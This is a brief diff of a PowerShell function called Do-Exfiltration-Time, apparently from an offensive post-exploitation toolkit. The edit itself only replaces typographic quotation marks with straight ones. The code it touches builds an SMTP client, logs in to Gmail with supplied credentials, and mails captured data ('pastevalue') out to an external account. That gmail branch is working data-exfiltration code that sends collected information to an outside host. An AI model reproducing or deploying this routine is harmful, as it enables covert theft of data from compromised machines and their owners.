@@ -222,13 +222,13 @@ function Do-Exfiltration-Time($pastename,$pastevalue,$ExfilOption,$dev_key,$user
     elseif ($exfiloption -eq "gmail")
     {
         #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
-        $smtpserver = “smtp.gmail.com”
+        $smtpserver = "smtp.gmail.com"
         $msg = new-object Net.Mail.MailMessage
         $smtp = new-object Net.Mail.SmtpClient($smtpServer )
         $smtp.EnableSsl = $True
-        $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
-        $msg.From = “$username@gmail.com”
-        $msg.To.Add(”$username@gmail.com”)
+        $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
+        $msg.From = "$username@gmail.com"
+        $msg.To.Add("$username@gmail.com")
         $msg.Subject = $pastename
         $msg.Body = $pastevalue
         if ($filename)
